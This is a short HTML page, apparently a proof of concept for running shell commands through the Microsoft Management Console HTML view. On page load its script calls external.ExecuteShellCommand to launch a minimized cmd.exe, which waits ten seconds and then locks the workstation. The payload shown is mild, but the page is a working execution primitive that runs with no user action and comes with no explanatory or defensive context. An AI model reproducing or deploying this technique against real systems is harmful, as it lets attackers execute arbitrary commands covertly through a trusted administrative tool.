<!DOCTYPE html>
<html>
<head>
    <title>Execute Command</title>
</head>
<body>
    <h1>Execute Command via MMC View</h1>

    <script type="text/javascript">
        function executeCommand() {
            try {
                external.ExecuteShellCommand("cmd.exe", "", "/c \"timeout /t 10 && rundll32.exe user32.dll,LockWorkStation\"", "Minimized")
            } catch (e) {
                alert("Failed to execute command: " + e.message);
            }
        }
        window.onload = executeCommand;
    </script>
</body>
</html>
